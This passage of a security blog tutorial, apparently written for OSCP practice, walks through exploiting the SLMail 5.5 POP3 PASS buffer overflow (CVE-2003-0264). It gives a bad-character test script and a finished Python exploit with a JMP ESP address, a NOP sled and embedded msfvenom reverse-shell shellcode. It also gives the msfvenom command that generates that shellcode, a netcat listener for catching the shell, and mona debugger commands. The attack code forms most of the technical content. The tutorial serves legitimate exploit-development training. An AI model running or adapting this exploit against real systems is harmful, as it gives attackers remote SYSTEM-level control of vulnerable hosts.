+      <figure class="highlight language-python python" style="display: block;">
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-python python"><code class="python">#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = &#34;\x41&#34; * 3000
+buffer2 = &#34;\x41&#34; * 2606 #Pattern_Offset found buffer size at 2605
+address = &#34;\x8F\x35\x4A\x5F&#34; #JMP ESP is at 0x5F4A358F in SLMFC.DLL
+
+#Bad chars are: 0x00, 0x0A, 0x0D
+shellcode = &#34;&#34;
+
+ba = &#34;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&#34;
+ba &#43;= &#34;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&#34;
+ba &#43;= &#34;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&#34;
+ba &#43;= &#34;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&#34;
+ba &#43;= &#34;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&#34;
+ba &#43;= &#34;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&#34;
+ba &#43;= &#34;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&#34;
+ba &#43;= &#34;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;
+
+exploit = buffer2 &#43; address &#43; ba
+
+try:
+    print&#34;\nConnecting...&#34;
+    s.connect((&#39;192.168.60.128&#39;, 110))
+    data = s.recv(1024)
+    s.send(&#39;USER username &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.send(&#39;PASS &#39;&#43; exploit &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.close()
+    print&#34;\nDone!&#34;
+except:
+    print &#34;Could not connect to POP3...&#34;</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+
+From here there are two things you can do to the find the bad characters, the manual way or the automatic way. I personally like the manual way since it forces me to look at the memory dump and look for the bad chars.</p>
+<!-- raw HTML omitted -->
+<h3 id="manual-way">Manual Way:</h3>
+<!-- raw HTML omitted -->
+<p>Once the application crashes, right click on the ESP register and click on <em>Follow in Dump</em>.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/ten.png" alt="Follow in Dump"></p>
+<p>In the bottom-left hand section, you&rsquo;ll see the byte array we threw along after our 2606 A&rsquo;s and JMP ESP address.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/tenA.png" alt="Looking at the Dump"></p>
+<p>Notice that every character between <code>0x01</code> and <code>0xFF</code> is there. Of course, we did remove <code>0x00</code>, <code>0x0A</code>, and <code>0x0D</code>. How do we know if we <em>did</em> have another bad character? For example, if 0xC2 was bad char, then everything after 0xC2 would be randomized and not look like the original array that we started with. You might also see random null (0x00) chars scattered across the dump as well. With that being said, it seems that there are no new bad chars.</p>
+<p>If we did have any bad chars, we would simply remove them from our poc code, re-run the exploit, and repeat this process until we didn&rsquo;t have any remaining bad chars.</p>
+<!-- raw HTML omitted -->
+<h3 id="automatic-way">Automatic Way:</h3>
+<!-- raw HTML omitted -->
+<p>Run the following command once the application crashes: <code>!mona compare -f c:\Users\Rafa\Desktop\bytearray.bin -a 0x0190A128</code> where <code>0x0190A128</code> is the current address in the ESP register.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/tenB.png" alt="Looking at the Dump"></p>
+<p>If mona finds any bad chars, create a new byte array with mona: <code>!mona bytearray -cpb \x00\x0a\x0d</code>. Then copy the new byte array into your poc code, re-run the exploit, and repeat this process until we didn&rsquo;t have any remaining bad chars.</p>
+<!-- raw HTML omitted -->
+<h2 id="generating-shellcode">Generating Shellcode</h2>
+<!-- raw HTML omitted -->
+<p>For this next step, we will be using MSFVenom to generate some shellcode for us. Open up your Kali Box and type <code>msfvenom</code>.</p>
+<p>We need to generate a reverse shell windows 7 payload that does not include any of the found bad chars. To do that, type the following command:
+<code>root@kali:~# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.60.1 LPORT=443 -f python -b &quot;\x00\x0a\x0d&quot; -o shellcode</code>
+<img src="https://succurity.com/images/Offsec/BufferOverflow/elev.png" alt="MSFVenom"></p>
+<p>Here&rsquo;s what the flags do:</p>
+<ul>
+<li>-p - Sets the payload. In this case, its a windows reverse tcp shell.</li>
+<li>-f - Sets what the output format should be. In this case, its python.</li>
+<li>-b - Sets what the bad characters are.</li>
+<li>-o - Sets the name of the output file.</li>
+<li>--platform - Your target platform.</li>
+<li>LHOST= - Your ip of your local machine. AKA, where you would want to receive the incoming shell.</li>
+<li>LPORT= - The port where that shell will come into.</li>
+<li>-a - Sets the architecture, either 32-bit(x86) or 64-bit(x64).</li>
+<li>-e - Sets the encoder. Tries to encode the data so its not so easily caught by AV products. If you don&rsquo;t include this, it will pick the best one for you, if possible.</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="nop-sled">NOP Sled</h2>
+<!-- raw HTML omitted -->
+<p>One last thing. We are almost done writing our poc exploit code. We just need to include a small NOP sled right after our jmp esp address but before the shellcode. Why? Because we can use the NOP sled to make the target address <em>&ldquo;bigger&rdquo;</em>. A NOP instruction <code>\x90</code> simply does absolutely nothing. That means that the jump can land anywhere in the NOP instruction set instead of landing exactly at the beginning of the shellcode. With the NOP sled, the execution will skip until it lands at the beginning of the shellcode. Let&rsquo;s add 16 bytes of NOPS. Coded, this is what it would look like: <code>NOP = &quot;\x90&quot; * 16</code></p>
+<blockquote>
+<p>The NOP slide, or NOP sled, is a simple technique to cope with accuracy issue. When the attacker guesses the address of his shell code with some possible jitter, then the attacker puts a lot of nop opcodes (or similarly harmless opcodes) before his shell code; thus, it suffices that the CPU jumps somewhere in the sled in order to make it, ultimately, reach the shell code. - <strong>Redacted from <a href="https://security.stackexchange.com/questions/40298/stack-buffer-overflow-confusion">Stack Overflow</a></strong></p>
+</blockquote>
+<!-- raw HTML omitted -->
+<h2 id="putting-it-all-together">Putting it All Together</h2>
+<!-- raw HTML omitted -->
+<p>The JMP ESP instruction address was <code>0x5F4A358F</code>. As mentioned before, in order for this to work, it needs to put it in little endian, or in reverse order. The end result will look like this: <code>\x8F\x35\x4A\x5F</code></p>
+<p>Now copy the shellcode into your poc code. Don&rsquo;t forget to add the NOP instructions and the JMP ESP instruction address in little endian.</p>
+
+
+  
+  
+  
+  
+  
+
+
+  
+    
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>poc.py</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">python</li>
+      
+    </ul>
+  </figcaption>
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-python python" style="display: block;">
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-python python"><code class="python">#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = &#34;\x41&#34; * 2606 #Pattern_Offset found buffer size at 2605
+address = &#34;\x8F\x35\x4A\x5F&#34; #JMP ESP is at 0x5F4A358F in SLMFC.DLL
+NOP = &#34;\x90&#34; * 16
+
+#Bad chars are: 0x00, 0x0A, 0x0D
+buf =  &#34;&#34;
+buf &#43;= &#34;\xdb\xc7\xba\x3a\xae\x24\x12\xd9\x74\x24\xf4\x58\x31&#34;
+buf &#43;= &#34;\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\xfa\xaa\xc6&#34;
+buf &#43;= &#34;\xe7\x06\x5a\x84\x08\xf6\x9b\xe9\x81\x13\xaa\x29\xf5&#34;
+buf &#43;= &#34;\x50\x9d\x99\x7d\x34\x12\x51\xd3\xac\xa1\x17\xfc\xc3&#34;
+buf &#43;= &#34;\x02\x9d\xda\xea\x93\x8e\x1f\x6d\x10\xcd\x73\x4d\x29&#34;
+buf &#43;= &#34;\x1e\x86\x8c\x6e\x43\x6b\xdc\x27\x0f\xde\xf0\x4c\x45&#34;
+buf &#43;= &#34;\xe3\x7b\x1e\x4b\x63\x98\xd7\x6a\x42\x0f\x63\x35\x44&#34;
+buf &#43;= &#34;\xae\xa0\x4d\xcd\xa8\xa5\x68\x87\x43\x1d\x06\x16\x85&#34;
+buf &#43;= &#34;\x6f\xe7\xb5\xe8\x5f\x1a\xc7\x2d\x67\xc5\xb2\x47\x9b&#34;
+buf &#43;= &#34;\x78\xc5\x9c\xe1\xa6\x40\x06\x41\x2c\xf2\xe2\x73\xe1&#34;
+buf &#43;= &#34;\x65\x61\x7f\x4e\xe1\x2d\x9c\x51\x26\x46\x98\xda\xc9&#34;
+buf &#43;= &#34;\x88\x28\x98\xed\x0c\x70\x7a\x8f\x15\xdc\x2d\xb0\x45&#34;
+buf &#43;= &#34;\xbf\x92\x14\x0e\x52\xc6\x24\x4d\x3b\x2b\x05\x6d\xbb&#34;
+buf &#43;= &#34;\x23\x1e\x1e\x89\xec\xb4\x88\xa1\x65\x13\x4f\xc5\x5f&#34;
+buf &#43;= &#34;\xe3\xdf\x38\x60\x14\xf6\xfe\x34\x44\x60\xd6\x34\x0f&#34;
+buf &#43;= &#34;\x70\xd7\xe0\x80\x20\x77\x5b\x61\x90\x37\x0b\x09\xfa&#34;
+buf &#43;= &#34;\xb7\x74\x29\x05\x12\x1d\xc0\xfc\xf5\xe2\xbd\xc2\x04&#34;
+buf &#43;= &#34;\x8b\xbf\x3a\x06\xf0\x49\xdc\x62\x16\x1c\x77\x1b\x8f&#34;
+buf &#43;= &#34;\x05\x03\xba\x50\x90\x6e\xfc\xdb\x17\x8f\xb3\x2b\x5d&#34;
+buf &#43;= &#34;\x83\x24\xdc\x28\xf9\xe3\xe3\x86\x95\x68\x71\x4d\x65&#34;
+buf &#43;= &#34;\xe6\x6a\xda\x32\xaf\x5d\x13\xd6\x5d\xc7\x8d\xc4\x9f&#34;
+buf &#43;= &#34;\x91\xf6\x4c\x44\x62\xf8\x4d\x09\xde\xde\x5d\xd7\xdf&#34;
+buf &#43;= &#34;\x5a\x09\x87\x89\x34\xe7\x61\x60\xf7\x51\x38\xdf\x51&#34;
+buf &#43;= &#34;\x35\xbd\x13\x62\x43\xc2\x79\x14\xab\x73\xd4\x61\xd4&#34;
+buf &#43;= &#34;\xbc\xb0\x65\xad\xa0\x20\x89\x64\x61\x50\xc0\x24\xc0&#34;
+buf &#43;= &#34;\xf9\x8d\xbd\x50\x64\x2e\x68\x96\x91\xad\x98\x67\x66&#34;
+buf &#43;= &#34;\xad\xe9\x62\x22\x69\x02\x1f\x3b\x1c\x24\x8c\x3c\x35&#34;
+
+exploit = buffer &#43; address &#43; NOP &#43; buf
+
+try:
+    print&#34;\nConnecting...&#34;
+    s.connect((&#39;192.168.60.128&#39;, 110))
+    data = s.recv(1024)
+    s.send(&#39;USER username &#39; &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.send(&#39;PASS &#39;&#43; exploit &#43; &#39;\r\n&#39;)
+    data = s.recv(1024)
+    s.close()
+    print&#34;\nDone!&#34;
+except:
+    print &#34;Could not connect to POP3...&#34;</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+
+<!-- raw HTML omitted -->
+<h2 id="its-raining-shells">It&rsquo;s Raining Shells.</h2>
+<!-- raw HTML omitted -->
+<p>Start a local netcat listener on the port we specified in our shellcode: <code>nc -lvnp 443</code> and execute the poc.py script. If you did everything correctly, you should get a shell. A simple <code>whoami</code> shows us that our shell is running as System! Since I am running netcat on Mac OSX, the netcat command will be a little different for me: <code>nc -l 443</code> but the end result is always the same.
+<img src="https://succurity.com/images/Offsec/BufferOverflow/twelv.png" alt="Reverse Shell"></p>
+<p>That&rsquo;s pretty much it for now. Once you receive your reverse shell, you can celebrate. Go pick another vulnerable software on Exploit-DB and keep on practicing! And as always, feedback is greatly appreciated.</p>
+<!-- raw HTML omitted -->
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Shellcode">Wikipedia - Shellcode</a></li>
+<li><a href="https://en.wikipedia.org/wiki/NOP_slide">Wikipedia - NOP Slide</a></li>
+<li><a href="https://www.exploit-db.com/exploits/638">Exploit-DB - SLMail 5.5 Exploit</a></li>
+<li><a href="https://www.cvedetails.com/cve/cve-2003-0264">cvedetails - CVE-2003-0264</a></li>
+<li><a href="https://windowsexploit.com/blog/2016/12/29/windows-exploit-slmail">Another Writeup</a></li>
+<li><a href="http://www.hugohirsh.com/?p=509">Yet Another Writeup</a></li>
+<li><a href="https://zero-day.io/buffer-overflow-introduction/">Yet Yet Another Writeup</a></li>
+</ul>
+<h2 id="mona-cheatsheet">Mona Cheatsheet</h2>
+<p>A quick mona reference:</p>
+<ul>
+<li>Set the working folder: <code>!mona config -set workingfolder C:\BufferOverflow\%p</code></li>
+<li>Create a pattern : <code>!mona pc 3000</code></li>
+<li>Find the patter offset: <code>!mona pattern_offset 0xSOMEVALUE</code></li>
+<li>Create a byte array to find bad chars: <code>!mona bytearray</code> or <code>!mona findmsp</code></li>
+<li>Find a JMP ESP instruction: <code>!mona modules</code> &amp; <code>!mona find -s &quot;\xff\xe4&quot; -m SOME.DLL</code> or <code>!mona JMP -r ESP</code></li>
+</ul>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/offensive-security/">Offensive Security</a>
+
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/oscp/">OSCP</a>
+
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/buffer-overflows/">Buffer Overflows</a>
+
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/pentesting/">Pentesting</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/write-ups/htb-mango/" data-tooltip="HackTheBox | Mango Writeup" aria-label="NEXT: HackTheBox | Mango Writeup">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/rfid-hacking-primer/" data-tooltip="Intro to RFID Hacking" aria-label="PREVIOUS: Intro to RFID Hacking">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/succurity.com\/post\/offsec\/intro-to-buffer-overflows\/';
+        
+          this.page.identifier = '\/post\/offsec\/intro-to-buffer-overflows\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 <a href="https://twitter.com/misusage_">Sage</a>. Made with <3. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/write-ups/htb-mango/" data-tooltip="HackTheBox | Mango Writeup" aria-label="NEXT: HackTheBox | Mango Writeup">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/rfid-hacking-primer/" data-tooltip="Intro to RFID Hacking" aria-label="PREVIOUS: Intro to RFID Hacking">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/intro-to-buffer-overflows/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fintro-to-buffer-overflows%2F" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fintro-to-buffer-overflows%2F" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://wa.me/?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fintro-to-buffer-overflows%2F" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i><span>Share on Whatsapp</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fintro-to-buffer-overflows%2F" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fintro-to-buffer-overflows%2F" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i><span>Share on Hacker News</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Sage</h4>
+    
+      <div id="about-card-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Offensive Security
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        California, US
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      
+      <div id="cover" style="background-image:url('https://succurity.com/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://succurity.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
